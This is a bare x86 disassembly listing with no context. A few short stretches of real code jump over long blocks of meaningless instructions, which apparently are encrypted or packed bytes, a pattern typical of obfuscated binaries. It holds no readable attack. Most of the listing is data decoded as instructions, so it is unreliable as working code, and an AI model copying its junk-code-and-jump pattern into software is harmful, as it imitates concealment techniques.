  40f33f:	test   DWORD PTR [ebp+0xf483ab4],esp
  40f345:	enter  0xe63d,0x88
  40f349:	add    al,0x16
  40f34b:	xchg   edi,eax
  40f34c:	enter  0x44bb,0x82
  40f350:	inc    ebp
  40f351:	jp     0x40f3a8
  40f353:	push   ecx
  40f354:	pushf  
  40f355:	cmc    
  40f356:	dec    ecx
  40f357:	inc    esp
  40f358:	fidiv  WORD PTR [edx-0x3]
  40f35b:	add    BYTE PTR ds:0x32f0b674,dl
  40f361:	repnz stos DWORD PTR es:[edi],eax
  40f363:	add    eax,0x5f41c241
  40f368:	sbb    BYTE PTR ds:0xd991f52e,dl
  40f36e:	loop   0x40f3ec
  40f370:	test   al,0xd3
  40f372:	cmc    
  40f373:	xchg   ebp,eax
  40f374:	mov    al,ds:0x739f1449
  40f379:	adc    bl,BYTE PTR [ecx+edx*4-0x8]
  40f37d:	fidiv  DWORD PTR [ecx+ebp*1-0x4850458a]
  40f384:	pop    ss
  40f385:	mov    bl,0x3c
  40f387:	xor    al,BYTE PTR [edx-0x765f4ca0]
  40f38d:	dec    esp
  40f38e:	sub    al,0x19
  40f390:	ins    DWORD PTR es:[edi],dx
  40f391:	inc    edi
  40f392:	retf   0xe3fa
  40f395:	rcr    BYTE PTR [edx],cl
  40f397:	xchg   DWORD PTR [eax-0x6],ebx
  40f39a:	ds jbe 0x40f3b2
  40f39d:	lahf   
  40f39e:	push   edi
  40f39f:	(bad)  
  40f3a0:	rol    esp,1
  40f3a2:	ins    BYTE PTR es:[edi],dx
  40f3a3:	rol    ebx,1
  40f3a5:	lahf   
  40f3a6:	xchg   edx,eax
  40f3a7:	mov    bl,0x8d
  40f3a9:	ret    0xdf27
  40f3ac:	sub    eax,0x9c13a250
  40f3b1:	test   eax,0xa959ba35
  40f3b6:	mov    ebx,0x1e37ddd8
  40f3bb:	cmp    dl,BYTE PTR [edi-0x3f601e35]
  40f3c1:	xchg   BYTE PTR [edx],ch
  40f3c3:	icebp  
  40f3c4:	int3   
  40f3c5:	mov    dh,0xb3
  40f3c7:	arpl   dx,si
  40f3c9:	mov    cs,WORD PTR [esi-0x3f]
  40f3cc:	sbb    cl,dl
  40f3ce:	in     eax,dx
  40f3cf:	mov    ch,0x67
  40f3d1:	aad    0x8d
  40f3d3:	mov    ds:0xb8dac562,eax
  40f3d8:	mov    ebp,0x1a7f4bff
  40f3dd:	sahf   
  40f3de:	adc    BYTE PTR [edx],dh
  40f3e0:	mov    esi,0x652c8f20
  40f3e5:	retf   
  40f3e6:	sub    eax,DWORD PTR [ebp+0x50]
  40f3e9:	pop    ss
  40f3ea:	scas   eax,DWORD PTR es:[edi]
  40f3eb:	push   es
  40f3ec:	call   FWORD PTR [esi+0x37]
  40f3ef:	pop    ds
  40f3f0:	aaa    
  40f3f1:	ja     0x40f3a1
  40f3f3:	push   0x7431bb8
  40f3f8:	pop    esi
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	repnz xchg esi,eax
  40f42b:	sub    esp,ebx
  40f42d:	scas   eax,DWORD PTR es:[edi]
  40f42e:	stos   DWORD PTR es:[edi],eax
  40f42f:	jle    0x40f4af
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f42d
  40f436:	rcl    DWORD PTR [edi],cl
  40f438:	pop    esi
  40f439:	(bad)  
  40f43a:	scas   eax,DWORD PTR es:[edi]
  40f43b:	sbb    DWORD PTR [ebx+0x179c0e05],esp
  40f441:	clc    
  40f442:	test   al,0x36
  40f444:	rcr    edx,1
  40f446:	(bad)  
  40f447:	popf   
  40f448:	cmp    BYTE PTR [ecx],0x3b
  40f44b:	outs   dx,BYTE PTR ds:[esi]
  40f44c:	popa   
  40f44d:	and    edi,DWORD PTR [edx+0x399112de]
  40f453:	fadd   QWORD PTR [ebp-0x15]
  40f456:	dec    ecx
  40f457:	jmp    0x7ec2fbc9
  40f45c:	lods   eax,DWORD PTR ds:[esi]
  40f45d:	add    eax,0xb2109a8
  40f462:	stos   BYTE PTR es:[edi],al
  40f463:	retf   0xb8d3
  40f466:	sti    
  40f467:	pop    edx
  40f468:	mov    WORD PTR [esi-0x2d],fs
  40f46b:	outs   dx,DWORD PTR ds:[esi]
  40f46c:	(bad)  
  40f46d:	xchg   esi,eax
  40f46e:	mov    eax,0x60c53d67
  40f473:	js     0x40f449
  40f475:	adc    eax,0x3b9f2a19
  40f47a:	lahf   
  40f47b:	cdq    
  40f47c:	sbb    ah,bh
  40f47e:	sub    BYTE PTR [ebx-0x7928ede6],al
  40f484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f485:	ficomp WORD PTR [eax]
  40f487:	sahf   
  40f488:	sbb    ch,bh
  40f48a:	inc    esi
  40f48b:	inc    ebp
  40f48c:	(bad)  
  40f48d:	and    DWORD PTR [ebx-0x21],ebp
  40f490:	fild   QWORD PTR [ebx-0x6b]
  40f493:	mov    ds:0x286d6d4f,al
  40f498:	stos   BYTE PTR es:[edi],al
  40f499:	in     eax,dx
  40f49a:	sub    DWORD PTR [eax-0x605d543f],esi
  40f4a0:	leave  
  40f4a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4a2:	arpl   WORD PTR [edi+0x7e],dx
  40f4a5:	imul   eax,DWORD PTR [ecx+edi*8+0x5e],0xa6988a93
  40f4ad:	idiv   edi
  40f4af:	pop    es
  40f4b0:	mov    dh,0x8f
  40f4b2:	pop    es
  40f4b3:	(bad)  [esi+0x34e61439]
  40f4b9:	adc    eax,0x3df3d865
  40f4be:	xchg   esp,eax
  40f4bf:	pop    esp
  40f4c0:	es cmp edi,eax
  40f4c3:	pop    esi
  40f4c4:	jbe    0x40f4f8
  40f4c6:	mov    DWORD PTR [esi+0x2b6885ed],edx
  40f4cc:	mov    ecx,0x4df5481e
  40f4d1:	or     edi,edx
  40f4d3:	xor    eax,0x808691d2
  40f4d8:	adc    ecx,DWORD PTR [edx-0xb81cbac]
  40f4de:	jg     0x40f53a
  40f4e0:	cdq    
  40f4e1:	imul   edx,DWORD PTR [edx+0x3b001f39],0x67
  40f4e8:	jmp    0x40f4df
  40f4ea:	inc    ebx
  40f4eb:	mov    dh,ah
  40f4ed:	cmp    DWORD PTR [esp+ecx*8-0x3300343a],esi
  40f4f4:	sahf   
  40f4f5:	rcr    edx,cl
  40f4f7:	je     0x40f576
  40f4f9:	imul   ecx,DWORD PTR [ebx+0x6e],0xffffffc8
  40f4fd:	or     BYTE PTR [ecx-0x50],al
  40f500:	jp     0x40f49e
  40f502:	lahf   
  40f503:	and    esi,ecx
  40f505:	test   eax,0xc0edae6f
  40f50a:	and    esp,DWORD PTR [esi-0x71]
  40f50d:	inc    esi
  40f50e:	fcomp  QWORD PTR [ecx+0x49]
  40f511:	mul    DWORD PTR [esi+0x71]
  40f514:	test   eax,0x2d0f2c14
  40f519:	sbb    eax,0x3643a21f
  40f51e:	xchg   esi,eax
  40f51f:	aaa    
  40f520:	mov    BYTE PTR [edx-0x1b],dh
  40f523:	pop    es
  40f524:	push   edi
  40f525:	adc    cl,BYTE PTR [ebx-0x2197d785]
  40f52b:	int    0x97
  40f52d:	popf   
  40f52e:	pop    esp
  40f52f:	jno    0x40f5a0
  40f531:	xor    cl,BYTE PTR [eax+0x336a02a6]
  40f537:	mov    dl,0x47
  40f539:	add    eax,DWORD PTR [edi+0x153b5da5]
  40f53f:	adc    WORD PTR [edi+0x5b4224cd],bp
  40f546:	xor    DWORD PTR [edx+ebx*1+0x600d71b4],ebx
  40f54d:	outs   dx,DWORD PTR ds:[esi]
  40f54e:	and    BYTE PTR [ebp+0x31],dl
  40f551:	jne    0x40f53d
  40f553:	jo     0x40f5af
  40f555:	pop    ebp
  40f556:	push   ebp
  40f557:	xchg   edi,eax
  40f558:	xchg   esp,eax
  40f559:	outs   dx,BYTE PTR ds:[esi]
  40f55a:	arpl   WORD PTR [edx-0x74b03597],si
  40f560:	cmp    al,0x77
  40f562:	push   esp
  40f563:	mov    BYTE PTR [esp+ecx*8-0x2489db36],ah
  40f56a:	and    BYTE PTR [edx-0x709021be],0x83
  40f571:	in     al,dx
  40f572:	add    cl,BYTE PTR [esi]
  40f574:	mov    cl,0x77
  40f576:	outs   dx,BYTE PTR ds:[esi]
  40f577:	fwait
  40f578:	lahf   
  40f579:	xchg   ebp,eax
  40f57a:	call   0x80c1:0x46efacba
  40f581:	fld    QWORD PTR [esi-0x63242023]
  40f587:	mov    eax,ds:0xb79c9e82
  40f58c:	add    dl,BYTE PTR [ecx-0x28]
  40f58f:	inc    esi
  40f590:	rcl    BYTE PTR [ecx+ebx*8-0x7264822d],cl
  40f597:	sub    bl,ch
  40f599:	inc    ecx
  40f59a:	mov    ebp,0x9685faa1
  40f59f:	mov    esp,0x679f50e4
  40f5a4:	xor    eax,0xff90582f
  40f5a9:	inc    si
  40f5ab:	inc    ebx
  40f5ac:	jns    0x40f573
  40f5ae:	ins    DWORD PTR es:[edi],dx
  40f5af:	mov    ch,0xd4
  40f5b1:	xor    al,0xbf
  40f5b3:	mov    ah,0xcf
  40f5b5:	or     bh,BYTE PTR [eax]
  40f5b7:	sbb    BYTE PTR [ebp+ecx*1-0x38],cl
  40f5bb:	clc    
  40f5bc:	fbld   TBYTE PTR [edi+0x22]
  40f5bf:	mov    eax,DWORD PTR fs:[ebx]
  40f5c2:	test   eax,0x73b6bbf4
  40f5c7:	cmp    BYTE PTR [edx+eiz*1+0x1a24eefe],ah
  40f5ce:	mov    ds:0x816a6146,al
  40f5d3:	or     BYTE PTR [edi-0x67549afd],0x94
  40f5da:	cmp    eax,0x67982bfd
  40f5df:	mov    bh,0x73
  40f5e1:	adc    edi,DWORD PTR [edi]
  40f5e3:	outs   dx,DWORD PTR ds:[esi]
  40f5e4:	(bad)  
  40f5e5:	call   0x26522976
  40f5ea:	sbb    eax,0xd9e54ad9
  40f5ef:	jp     0xc8930e56
  40f5f5:	mov    ebx,0x1596a2a6
  40f5fa:	out    dx,eax
  40f5fb:	mov    ds:0x9a05dbbf,al
  40f600:	into   
  40f601:	cmp    cl,BYTE PTR ds:0xab1f98e4
  40f607:	add    DWORD PTR [ecx-0x19dc5795],edx
  40f60d:	push   eax
  40f60e:	fs out dx,al
  40f610:	dec    ebx
  40f611:	ja     0x40f62d
  40f613:	and    eax,0x2040cfe7
  40f618:	cmc    
  40f619:	in     eax,dx
  40f61a:	dec    esp
  40f61b:	ins    BYTE PTR es:[edi],dx
  40f61c:	(bad)  
  40f61d:	fs aad 0x46
  40f620:	push   esi
  40f621:	outs   dx,DWORD PTR ds:[esi]
  40f622:	int3   
  40f623:	cmp    edi,DWORD PTR [ecx+edx*1-0x77]
  40f627:	inc    esp
  40f628:	xor    esi,0x1d
  40f62b:	cmc    
  40f62c:	jmp    0x40f60f
  40f62e:	lods   al,BYTE PTR ds:[esi]
  40f62f:	jo     0x40f60e
  40f631:	add    BYTE PTR [edi],0x4b
  40f634:	and    DWORD PTR [edx+0x620c3d11],esi
  40f63a:	add    eax,0xaf2f9a26
  40f63f:	bound  esp,QWORD PTR [ecx-0x7ac9882a]
  40f645:	push   esp
  40f646:	rol    BYTE PTR [ebx+0x5],1
  40f649:	sbb    ebx,esi
  40f64b:	mov    al,ds:0xca3edcc1
  40f650:	jb     0x40f6c3
  40f652:	mov    ds:0x283f0463,al
  40f657:	xchg   ebx,eax
  40f658:	mov    ecx,0x5b7ac2f2
  40f65d:	mov    esp,0x6223fb45
  40f662:	cld    
  40f663:	imul   esp,DWORD PTR [edx+ecx*4],0x59
  40f667:	lea    ebx,[edi]
  40f669:	adc    DWORD PTR [ebx],ecx
  40f66b:	sbb    DWORD PTR [esi+0x320a4890],eax
  40f671:	push   0x6d
  40f673:	(bad)  
  40f674:	sbb    DWORD PTR [edi+0x45],ebx
  40f677:	jo     0x40f6b1
  40f679:	pop    esi
  40f67a:	ret    0x34fd
  40f67d:	ss push cs
  40f67f:	mov    al,ds:0x69ca8ab2
  40f684:	jecxz  0x40f611
  40f686:	xchg   edi,eax
  40f687:	shr    DWORD PTR ds:0x16b6d489,cl
  40f68d:	mov    ah,0xae
  40f68f:	mov    DWORD PTR [eax+0x67],eax
  40f692:	cld    
  40f693:	inc    edi
  40f694:	and    eax,0x86f749e9
  40f699:	add    ebp,DWORD PTR [eax+0x6bb64c8a]
  40f69f:	out    0x42,eax
  40f6a1:	sar    BYTE PTR [edi-0x7d],0x6e
  40f6a5:	mov    al,0x3f
  40f6a7:	xchg   esi,eax
  40f6a8:	into   
  40f6a9:	call   0xbf2e6987
  40f6ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6af:	shl    DWORD PTR [edi],cl
  40f6b1:	jne    0x40f66b
  40f6b3:	clc    
  40f6b4:	pop    ebp
  40f6b5:	arpl   bp,si
  40f6b7:	adc    DWORD PTR [ebp-0x41c43dda],esp
  40f6bd:	jbe    0x40f73d
  40f6bf:	loop   0x40f6fe
  40f6c1:	ds ds sbb al,ah
  40f6c5:	(bad)  
  40f6c6:	jbe    0x40f709
  40f6c8:	xor    DWORD PTR [eax-0x56],ecx
  40f6cb:	lds    ecx,FWORD PTR [ecx]
  40f6cd:	mov    ds:0x34eee169,al
  40f6d2:	mov    ebp,0xc5f42dc8
  40f6d7:	mov    ebx,0xa2381859
  40f6dc:	push   0xffffffb4
  40f6de:	cmp    eax,0xd056f27f
  40f6e3:	test   eax,0xc76fdf3c
  40f6e8:	inc    ebp
  40f6e9:	cld    
  40f6ea:	xor    al,BYTE PTR [ebp+0x2d81f89c]
  40f6f0:	daa    
  40f6f1:	cmp    BYTE PTR [ebx+0x0],al
  40f6f4:	jb     0x40f752
  40f6f6:	add    BYTE PTR [eax],al
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	(bad)  
  40f717:	lea    ebp,[esi+0x7eb6dd35]
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f6e6
  40f723:	iret   
  40f724:	sub    al,0xab
  40f726:	rcr    dl,cl
  40f728:	pop    edx
  40f729:	inc    esp
  40f72a:	or     ecx,ebx
  40f72c:	addr16 mov eax,ds:0xa7ab
  40f730:	adc    BYTE PTR [ecx+0x75],al
  40f733:	ins    DWORD PTR es:[edi],dx
  40f734:	or     eax,0x654e0a33
  40f739:	std    
  40f73a:	mov    al,ds:0x80af95d7
  40f73f:	je     0x40f754
  40f741:	mov    DWORD PTR ds:0x74fc2e0f,ecx
  40f747:	(bad)  
  40f748:	aam    0x6d
  40f74a:	(bad)  
  40f74b:	cmc    
  40f74c:	icebp  
  40f74d:	jl     0x40f75a
  40f74f:	jne    0x40f7bf
  40f751:	and    eax,DWORD PTR ds:0x605d3a32
  40f757:	repz rep lods eax,DWORD PTR ds:[esi]
  40f75a:	scas   al,BYTE PTR es:[edi]
  40f75b:	add    bh,BYTE PTR [eax]
  40f75d:	cmp    al,BYTE PTR [ebp+0x3e35ec91]
  40f763:	dec    ecx
  40f764:	xchg   BYTE PTR [eax-0x22],dh
  40f767:	pushf  
  40f768:	xchg   ecx,eax
  40f769:	pushf  
  40f76a:	xchg   ecx,eax
  40f76b:	cdq    
  40f76c:	hlt    
  40f76d:	es (bad) 
  40f76f:	xor    bh,BYTE PTR [edx]
  40f771:	adc    ch,BYTE PTR [eax-0x3cf8ced]
  40f777:	mov    bh,bh
  40f779:	out    0xf8,eax
  40f77b:	sbb    dl,BYTE PTR [esi]
  40f77d:	aam    0xb7
  40f77f:	aaa    
  40f780:	out    0x2d,al
  40f782:	aam    0x11
  40f784:	add    eax,0x7804a32
  40f789:	pop    ecx
  40f78a:	je     0x40f784
  40f78c:	push   ebx
  40f78d:	call   0xf0aa0d1e
  40f792:	imul   ebx,DWORD PTR [edx],0x8ed05e99
  40f798:	iret   
  40f799:	add    al,0xa3
  40f79b:	sub    BYTE PTR [ebp-0x66],0xc8
  40f79f:	ds out dx,eax
  40f7a1:	test   al,0x3
  40f7a3:	mov    dl,0xa
  40f7a5:	xchg   esp,eax
  40f7a6:	repnz adc BYTE PTR [edx-0x70125c1f],bl
  40f7ad:	dec    edi
  40f7ae:	dec    eax
  40f7af:	popf   
  40f7b0:	sbb    bl,dh
  40f7b2:	cli    
  40f7b3:	xchg   edi,eax
  40f7b4:	mov    edi,0xded52723
  40f7b9:	and    BYTE PTR [esi+0x6d58f9ed],bh
  40f7bf:	jmp    0x6762df17
  40f7c4:	pop    esp
  40f7c5:	aad    0x5b
  40f7c7:	mov    ebp,0xb97fa18a
  40f7cc:	pop    ss
  40f7cd:	adc    al,0xc3
  40f7cf:	call   0x6b10:0xff236655
  40f7d6:	shl    DWORD PTR [eax],cl
  40f7d8:	icebp  
  40f7d9:	popa   
  40f7da:	jo     0x40f7ca
  40f7dc:	aaa    
  40f7dd:	cmc    
  40f7de:	push   ds
  40f7df:	and    ecx,DWORD PTR [eax]
  40f7e1:	pusha  
  40f7e2:	(bad)  
  40f7e3:	stc    
  40f7e4:	call   0xda81a250
  40f7e9:	push   esp
  40f7ea:	outs   dx,DWORD PTR ds:[esi]
  40f7eb:	or     al,0x7
  40f7ed:	lds    ecx,FWORD PTR [edx-0x23]
  40f7f0:	mov    cl,0xf4
  40f7f2:	(bad)  
  40f7f3:	xor    DWORD PTR [ecx],eax
  40f7f5:	int3   
  40f7f6:	in     al,0xf6
  40f7f8:	loopne 0x40f843
  40f7fa:	scas   al,BYTE PTR es:[edi]
  40f7fb:	add    BYTE PTR [ebx],cl
  40f7fd:	mov    al,ds:0xd605657d
  40f802:	dec    ebp
  40f803:	push   esi
  40f804:	or     esi,DWORD PTR [ebp-0x3732d196]
  40f80a:	inc    ebx
  40f80b:	mov    edi,edx
  40f80d:	jmp    0x40f861
  40f80f:	scas   eax,DWORD PTR es:[edi]
  40f810:	mov    eax,0x4636d39f
  40f815:	lods   al,BYTE PTR ds:[esi]
  40f816:	test   al,0x68
  40f818:	push   ss
  40f819:	and    DWORD PTR [edi],esp
  40f81b:	or     eax,0x30a1444c
  40f820:	inc    esi
  40f821:	je     0x40f7b0
  40f823:	int    0xba
  40f825:	xchg   edi,eax
  40f826:	in     al,0xbd
  40f828:	xchg   BYTE PTR [ebp+ebp*8-0x5],ah
  40f82c:	mov    ah,0x92
  40f82e:	mov    ebx,DWORD PTR [edx-0x145dd9ec]
  40f834:	lea    ebp,[esi-0x3894f32a]
  40f83a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f83b:	cmp    edx,DWORD PTR [eax+0x3c04885]
  40f841:	enter  0x3ea3,0x1a
  40f845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f846:	(bad)
  40f849:	cmp    BYTE PTR ds:0x7c21165,bh
  40f84f:	imul   esp,DWORD PTR [eax+ebp*4],0xc4f9a7f1
  40f856:	lds    ecx,FWORD PTR [edi]
  40f858:	jbe    0x40f844
  40f85a:	jmp    0xef4e:0xee63605a
  40f861:	mov    ah,0x5d
  40f863:	(bad)  
  40f865:	(bad)  
  40f866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f867:	mov    eax,0x1556d997
  40f86c:	jne    0x40f8d7
  40f86e:	rol    BYTE PTR [edi+0x4f],1
  40f871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f872:	iret   
  40f873:	push   esp
  40f874:	push   edx
  40f875:	je     0x40f87b
  40f877:	sbb    ch,BYTE PTR [edi-0x6cae54b8]
  40f87d:	mov    esp,0xb2aeda78
  40f882:	jae    0x40f8ac
  40f884:	ins    DWORD PTR es:[edi],dx
  40f885:	push   ss
  40f886:	xlat   BYTE PTR ds:[ebx]
  40f887:	xor    al,0xca
  40f889:	stc    
  40f88a:	popf   
  40f88b:	in     al,0xb5
  40f88d:	sahf   
  40f88e:	imul   esi,DWORD PTR [edx+ebp*1+0x59698150],0xffffff92
  40f896:	dec    edi
  40f897:	dec    edx
  40f898:	mov    ah,0x5c
  40f89a:	jae    0x40f8e7
  40f89c:	aam    0xd5
  40f89e:	test   DWORD PTR [edx],esi
  40f8a0:	addr16 int3 
  40f8a2:	xor    ecx,DWORD PTR [esi+eiz*8+0x43]
  40f8a6:	aad    0x9a
  40f8a8:	js     0x40f8f7
  40f8aa:	cwde   
  40f8ab:	loope  0x40f83a
  40f8ad:	xor    esi,DWORD PTR [edx-0x72]
  40f8b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8b1:	adc    ebx,DWORD PTR [eax]
  40f8b3:	lods   al,BYTE PTR ds:[esi]
  40f8b4:	test   al,0x65
  40f8b6:	outs   dx,BYTE PTR ds:[esi]
  40f8b7:	shl    DWORD PTR [edx+0x7e5cf758],cl
  40f8bd:	int3   
  40f8be:	fsub   DWORD PTR [ecx-0x75]
  40f8c1:	call   0x75e0:0x5f5629cf
  40f8c8:	push   0xffffff9a
  40f8ca:	mov    eax,0xa4b34cc8
  40f8cf:	(bad)  
  40f8d0:	out    0xf8,al
  40f8d2:	retf   
  40f8d3:	jae    0x40f8e5
  40f8d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8d6:	and    al,0xe1
  40f8d8:	js     0x40f91a
  40f8da:	cmp    eax,0x1602896e
  40f8df:	mov    ds:0xf5dcdf19,al
  40f8e4:	or     dl,BYTE PTR [edi+0x40948813]
  40f8ea:	das    
  40f8eb:	fdivr  st(3),st
  40f8ed:	test   eax,0xf4267e0c
  40f8f2:	inc    edx
  40f8f3:	sub    al,0x36
  40f8f5:	inc    esp
  40f8f6:	jp     0x40f889
  40f8f8:	jmp    0x707cb5cd
  40f8fd:	cmp    BYTE PTR [edx+0x17],ch
  40f900:	inc    ebx
  40f901:	jp     0x40f88a
  40f903:	shl    BYTE PTR [eax-0x5c],0x1d
  40f907:	push   edx
  40f908:	clc    
  40f909:	dec    eax
  40f90a:	lea    edi,[edi]
  40f90c:	fidiv  DWORD PTR [ebx+0x27]
  40f90f:	iret   
  40f910:	jno    0x40f8d8
  40f912:	xchg   BYTE PTR [edi-0x2f07b00b],ah
  40f918:	stc    
  40f919:	xor    eax,0xa4b5c22c
  40f91e:	fidiv  DWORD PTR [edi-0x1a]
  40f921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f922:	stos   DWORD PTR es:[edi],eax
  40f923:	xor    al,0xe6
  40f925:	mov    ds:0x2778a1bc,al
  40f92a:	xchg   BYTE PTR [ecx-0x42],cl
  40f92d:	sbb    dl,ch
  40f92f:	call   0xd078:0x2502bb8f
  40f936:	sub    eax,0xdc75cd92
  40f93b:	mov    BYTE PTR [ebx],0x26
  40f93e:	mov    cl,0x74
  40f940:	jmp    0x40f912
  40f942:	neg    BYTE PTR [edi+0x2a]
  40f945:	sub    ebx,DWORD PTR [ebx-0x5b]
  40f948:	adc    al,0xf3
  40f94a:	sar    DWORD PTR [ecx-0xd3d17ac],0xa5
  40f951:	sbb    edi,ecx
  40f953:	and    cl,dl
  40f955:	out    0xec,eax
  40f957:	or     ch,dh
  40f959:	aam    0xed
  40f95b:	and    BYTE PTR [ebx],dl
  40f95d:	pextrw eax,mm7,0x21
  40f961:	fwait
  40f962:	pop    ebp
  40f963:	pusha  
  40f964:	xor    eax,DWORD PTR [edx]
  40f966:	inc    ebx
  40f967:	aam    0x58
  40f969:	dec    edx
  40f96a:	cli    
  40f96b:	mov    bl,0xec
  40f96d:	cmp    BYTE PTR [ebp-0x158982bc],0xff
  40f974:	ins    DWORD PTR es:[edi],dx
  40f975:	mov    edi,0xf4fbe666
  40f97a:	pop    ss
  40f97b:	cmp    al,BYTE PTR [ebx+edi*2+0x6d]
  40f97f:	add    eax,0x1836daba
  40f984:	cmp    eax,0xb1a83023
  40f989:	sub    ebp,DWORD PTR [ecx+eiz*2-0x7f]
  40f98d:	outs   dx,BYTE PTR ds:[esi]
  40f98e:	push   edi
  40f98f:	xchg   ecx,eax
  40f990:	mov    al,0x46
  40f992:	int3   
  40f993:	bound  ecx,QWORD PTR [eax+ecx*2]
  40f996:	jnp    0x40f986
  40f998:	sbb    BYTE PTR [esp+edi*4-0x8fa98ef],cl
  40f99f:	xchg   esp,eax
  40f9a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a2:	sbb    BYTE PTR [ebp-0x31],0xfb
  40f9a6:	out    dx,al
  40f9a7:	aam    0xd9
  40f9a9:	jb     0x40f9d4
  40f9ab:	cmp    eax,DWORD PTR [edx]
  40f9ad:	repnz outs dx,BYTE PTR ds:[esi]
  40f9af:	(bad)  
  40f9b0:	cmp    al,0xa0
  40f9b2:	shr    BYTE PTR [eax+0x16],0x53
  40f9b6:	int    0x27
  40f9b8:	adc    DWORD PTR [ebp+esi*1-0x196ff8fc],ebp
  40f9bf:	aaa    
  40f9c0:	xchg   esp,eax
  40f9c1:	and    eax,0x5844fc2b
  40f9c6:	call   DWORD PTR [eax-0x7]
  40f9c9:	icebp  
  40f9ca:	retf   0x8aef
  40f9cd:	pushf  
  40f9ce:	mov    dl,0x97
  40f9d0:	jle    0x40f9db
  40f9d2:	adc    al,0x9c
  40f9d4:	push   esi
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	sti    
  40fa11:	push   es
  40fa12:	out    dx,eax
  40fa13:	and    DWORD PTR [ebx],ecx
  40fa15:	mov    ch,0x7e
  40fa17:	jle    0x40f9c5
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40fa97
  40fa1d:	iret   
  40fa1e:	or     esi,esp
  40fa20:	(bad)  
  40fa21:	sbb    DWORD PTR [eax+0x3828a5d0],edi
  40fa27:	cwde   
  40fa28:	popf   
  40fa29:	test   BYTE PTR [esi],ah
  40fa2b:	pop    ds
  40fa2c:	or     ecx,ebx
  40fa2e:	addr16 xor al,0x4
  40fa31:	or     DWORD PTR [ebp-0x17],eax
  40fa34:	rcr    DWORD PTR ds:0x80ddbc3b,1
  40fa3a:	rol    cl,cl
  40fa3c:	xchg   ebp,eax
  40fa3d:	mov    edx,ebp
  40fa3f:	pop    ecx
  40fa40:	push   es
  40fa41:	add    eax,0xcd86ae4f
  40fa46:	dec    edi
  40fa47:	js     0x40fac3
  40fa49:	adc    al,0xa8
  40fa4b:	mov    ebx,0xe23bf664
  40fa50:	add    DWORD PTR [ecx+0x57],ecx
  40fa53:	sar    DWORD PTR [edx-0x464921be],0xe2
  40fa5a:	and    eax,0x56131277
  40fa5f:	cwde   
  40fa60:	(bad)  ds:0xfb54a434
  40fa66:	not    DWORD PTR [edi+0x7dea89f0]
  40fa6c:	xchg   edx,eax
  40fa6d:	and    DWORD PTR [eax-0x263758ac],esp
  40fa73:	out    0x2c,eax
  40fa75:	enter  0x25c9,0x1d
  40fa79:	(bad)  
  40fa7a:	cmc    
  40fa7b:	and    BYTE PTR [eax+0x4362fcf2],0xfc
  40fa82:	ja     0x40faae
  40fa84:	mov    ecx,0xd0a015fa
  40fa89:	mov    eax,0x9f954a81
  40fa8e:	push   esi
  40fa8f:	ret    
  40fa90:	orps   xmm6,XMMWORD PTR [edi+0x72829781]
  40fa97:	sbb    ebp,edi
  40fa99:	xchg   ebp,eax
  40fa9a:	int3   
  40fa9b:	inc    ebx
  40fa9c:	scas   eax,DWORD PTR es:[edi]
  40fa9d:	jb     0x40fae9
  40fa9f:	jg     0x40fac4
  40faa1:	xchg   DWORD PTR [eax+0x4d],ebp
  40faa4:	and    eax,0x4edaeac8
  40faa9:	rcl    BYTE PTR [esi-0x7078c5],cl
  40faaf:	mov    ebx,0xa2b9be9f
  40fab4:	(bad)  
  40fab5:	mov    ecx,0x475fb3c2
  40faba:	call   0xc2f924d
  40fabf:	jne    0x40fae0
  40fac1:	mov    ds:0x1e50eb2c,al
  40fac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fac7:	(bad)  
  40fac9:	fcom   DWORD PTR [esi+0x5b]
  40facc:	dec    ecx
  40facd:	add    ah,al
  40facf:	out    dx,eax
  40fad0:	dec    ecx
  40fad1:	adc    DWORD PTR [edx],ecx
  40fad3:	rcl    DWORD PTR [ebx],0xb1
